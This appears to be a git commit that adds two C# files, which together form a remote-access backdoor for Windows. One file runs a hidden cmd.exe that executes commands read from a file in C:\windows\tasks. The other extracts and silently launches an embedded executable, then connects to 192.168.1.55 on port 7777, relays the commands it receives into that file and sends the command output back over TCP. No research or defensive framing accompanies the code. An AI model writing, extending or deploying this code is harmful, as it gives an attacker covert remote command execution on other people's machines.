4c2badd30f629a11f46bf87043d96fe8fb9ae9eb
Watislove <simplemail@google.com>
2024-07-10 17:40:21 +0300

    add project

---
+++ inputfile.cs
@@ -0,0 +1,162 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.Diagnostics;
+
+public class FileWatcher
+{
+    static FileSystemWatcher watcher;
+    static Process p;
+    static string watcherDir = "C:\\windows\\tasks";
+    static string watcherFilter = "command.txt";
+    static string cmdFile = "C:\\windows\\tasks\\command.txt";
+    static string outFile = "C:\\windows\\tasks\\output.txt";
+    static private AutoResetEvent _outputWaitHandle;
+    static string cmdOutput;
+
+
+
+    public static void Main(string[] args)
+    {
+
+        createProcess();
+        startWatcher();
+
+        System.Threading.Thread.Sleep(Timeout.Infinite);
+
+
+    }
+
+    static private void createProcess()
+    {
+        try
+        {
+            _outputWaitHandle = new AutoResetEvent(false);
+            p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardInput = true;
+            p.StartInfo.RedirectStandardError = true;
+
+            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            p.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+
+            p.Start();
+            p.BeginErrorReadLine();
+            p.BeginOutputReadLine();
+        }
+        catch
+        {
+            System.Environment.Exit(1);
+        }
+    }
+
+    static private void startWatcher()
+    {
+        try
+        {
+            watcher = new FileSystemWatcher();
+            watcher.Path = watcherDir;
+            watcher.NotifyFilter = NotifyFilters.Attributes |
+            NotifyFilters.CreationTime |
+            NotifyFilters.FileName |
+            NotifyFilters.LastAccess |
+            NotifyFilters.LastWrite |
+            NotifyFilters.Security |
+            NotifyFilters.Size;
+
+            watcher.Filter = watcherFilter;
+            watcher.Changed += new FileSystemEventHandler(OnChanged);
+            watcher.EnableRaisingEvents = true;
+        }
+        catch (Exception ex)
+        {
+            p.Kill();
+            System.Environment.Exit(1);
+        }
+    }
+
+    static void execute(string cmd)
+    {
+        try
+        {
+            p.StandardInput.WriteLine(cmd);
+        }
+        catch
+        {
+            p.WaitForExit();
+        }
+    }
+
+    public static string get_command(String file_name)
+    {
+        int attempts = 40;
+        while (attempts != 0)
+        {
+            System.Threading.Thread.Sleep(100);
+            try
+            {
+                string cmd = File.ReadAllText(file_name);
+                return cmd;
+            }
+            catch
+            {
+                attempts--;
+            }
+        }
+        return "";
+    }
+
+    // Define the event handlers. 
+    public static void OnChanged(object source, FileSystemEventArgs e)
+    {
+        // Specify what is done when a file is changed.
+        try
+        {
+            watcher.EnableRaisingEvents = false;
+            string cmd;
+            cmd = get_command(cmdFile);
+            if (cmd != "")
+            {
+                execute(cmd);
+            }
+        }
+        finally
+        {
+            watcher.EnableRaisingEvents = true;
+        }
+    }
+
+    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs e)
+    {
+        int attempts = 60;
+        int interval = 100;
+        if (!String.IsNullOrEmpty(e.Data))
+        {
+            while (attempts > 0)
+            {
+                try
+                {
+                    using (StreamWriter sw = File.AppendText(outFile))
+                    {
+                        sw.WriteLine(e.Data, Encoding.UTF8);
+                        break;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    attempts--;
+                    interval += 5;
+                    System.Threading.Thread.Sleep(interval);
+                    if (attempts == 0)
+                    {
+                        System.Environment.Exit(1);
+                    }
+                }
+            }
+        }
+    }
+}
---
+++ simplers/main.cs
@@ -0,0 +1,213 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Text;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.Reflection;
+
+namespace tcp_client_file_write
+{
+    internal class Program
+    {
+        static string ip = "192.168.1.55";
+        static int port = 7777;
+        static int connectAttempts = 5;
+        // TCP -> FILE -> TCP
+        //  fromTCP -> toFile -> fromFile -> toTCP
+        static TcpClient tcpClient;
+        static FileSystemWatcher watcher;
+        static FileStream fileOutStream;
+        static FileStream fileInStream;
+        static Stream tcpStream;
+        static StreamReader fromTCP;
+        static StreamWriter toFile;
+        static StreamReader fromFile;
+        static StreamWriter toTCP;
+        static string watcherDir = "C:\\windows\\tasks";
+        static string fileIn = "C:\\windows\\tasks\\command.txt";
+        static string fileOut = "C:\\Windows\\tasks\\output.txt";
+
+        static void Main(string[] args)
+        {
+            string startupFilePath = Path.Combine(Path.GetTempPath(), "startup.exe");
+            ExtractAndRunEmbeddedResource("simplers.inputfile.exe", startupFilePath);
+
+            createFile(fileOut);
+            createFile(fileIn);
+            try
+            {
+                using (TcpClient tcpClient = TcpConnect(ip, port))
+                {
+                    tcpStream = tcpClient.GetStream();
+                    using (fromTCP = new StreamReader(tcpStream, Encoding.UTF8))
+                    {
+                        using (toTCP = new StreamWriter(tcpStream, Encoding.UTF8))
+                        {
+                            startWatcher(watcherDir, "output.txt");
+                            string cmd;
+                            while (true)
+                            {
+                                try
+                                {
+                                    cmd = fromTCP.ReadLine();
+                                    writeToFile(fileIn, cmd);
+                                }
+                                catch { break; }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                System.Environment.Exit(100);
+            }
+        }
+
+        public static void createFile(string filePath)
+        {
+            try
+            {
+                FileStream fs = File.OpenWrite(filePath);
+                fs.SetLength(0);
+                fs.Close();
+            }
+            catch
+            {
+                return;
+            }
+        }
+
+        public static void writeToFile(string filePath, string data)
+        {
+            int attempts = 60;
+            int interval = 100;
+            while (attempts > 0)
+            {
+                try
+                {
+                    File.WriteAllText(filePath, data);
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    System.Threading.Thread.Sleep(interval);
+                    attempts--;
+                    if (attempts == 0)
+                    {
+                        System.Environment.Exit(1);
+                    }
+                }
+            }
+        }
+
+        public static void startWatcher(string dir, string filter)
+        {
+            try
+            {
+                watcher = new FileSystemWatcher(dir);
+                watcher.NotifyFilter = NotifyFilters.Attributes |
+                NotifyFilters.CreationTime |
+                NotifyFilters.FileName |
+                NotifyFilters.LastWrite |
+                NotifyFilters.Security |
+                NotifyFilters.Size;
+
+                watcher.Filter = filter;
+                watcher.Changed += new FileSystemEventHandler(OnChanged);
+                watcher.EnableRaisingEvents = true;
+            }
+            catch (Exception ex)
+            {
+                watcher.Dispose();
+                System.Environment.Exit(1);
+            }
+        }
+
+        public static TcpClient TcpConnect(string ip, int port)
+        {
+            TcpClient client = new TcpClient();
+            while (connectAttempts != 0)
+            {
+                try
+                {
+                    client.Connect(ip, port);
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    System.Threading.Thread.Sleep(5000);
+                    connectAttempts--;
+                    if (connectAttempts == 0)
+                    {
+                        client.Close();
+                        System.Environment.Exit(1);
+                    }
+                }
+            }
+            return client;
+        }
+
+        public static void OnChanged(object source, FileSystemEventArgs e)
+        {
+            watcher.EnableRaisingEvents = false;
+            int attempts = 60;
+            int interval = 100;
+            string data;
+
+            while (attempts > 0)
+            {
+                try
+                {
+                    System.Threading.Thread.Sleep(interval);
+                    data = File.ReadAllText(fileOut);
+                    File.WriteAllText(fileOut, string.Empty);
+                    byte[] info = new UTF8Encoding(true).GetBytes(data);
+                    tcpStream.Write(info, 0, info.Length);
+                    tcpStream.Flush();
+                    watcher.EnableRaisingEvents = true;
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    System.Threading.Thread.Sleep(interval);
+                    attempts--;
+                    if (attempts == 0)
+                    {
+                        data = "";
+                        watcher.EnableRaisingEvents = true;
+                    }
+                }
+            }
+        }
+
+        public static void ExtractAndRunEmbeddedResource(string resourceName, string outputPath)
+        {
+            try
+            {
+                using (Stream resourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                {
+                    if (resourceStream == null)
+                        throw new Exception("Resource not found.");
+
+                    using (FileStream fileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
+                    {
+                        resourceStream.CopyTo(fileStream);
+                    }
+                }
+
+                Process process = new Process();
+                process.StartInfo.FileName = outputPath;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                process.Start();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("An error occurred: " + ex.Message);
+            }
+        }
+    }
+}
+
